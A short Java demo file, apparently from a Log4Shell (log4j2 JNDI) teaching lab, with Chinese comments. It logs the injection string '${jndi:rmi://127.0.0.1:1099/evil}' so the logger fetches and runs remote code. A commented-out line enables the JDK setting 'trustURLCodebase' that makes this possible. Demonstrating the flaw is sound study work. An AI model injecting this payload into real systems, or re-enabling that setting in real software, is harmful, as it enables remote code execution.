package com.fly.log4jbug;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @Title: 模拟运行存在漏洞log4j2的服务器
 * @ClassName: geektime.log.ServerTest.java
 * @Description:
 *
 * @Copyright 2020-2021  - Powered By 研发中心
 * @author: 王延飞
 * @date:  2022/1/6 16:23
 * @version V1.0
 */
public class ServerTest {

    private static final Logger logger = LoggerFactory.getLogger(ServerTest.class);

    public static void main(String[] args) {

        //有些高版本jdk需要打开此行代码
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        // 模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码 同一台可以使用127.0.0.1
        // ${jndi:rmi//127.0.0.1:1099/evil}，表示通过JNDI Lookup功能，获取rmi//127.0.0.1:1099/evil上的变量内容。
        String username = "${jndi:rmi://127.0.0.1:1099/evil}";
        //正常打印业务日志
        logger.error("username:{}",username);
    }
}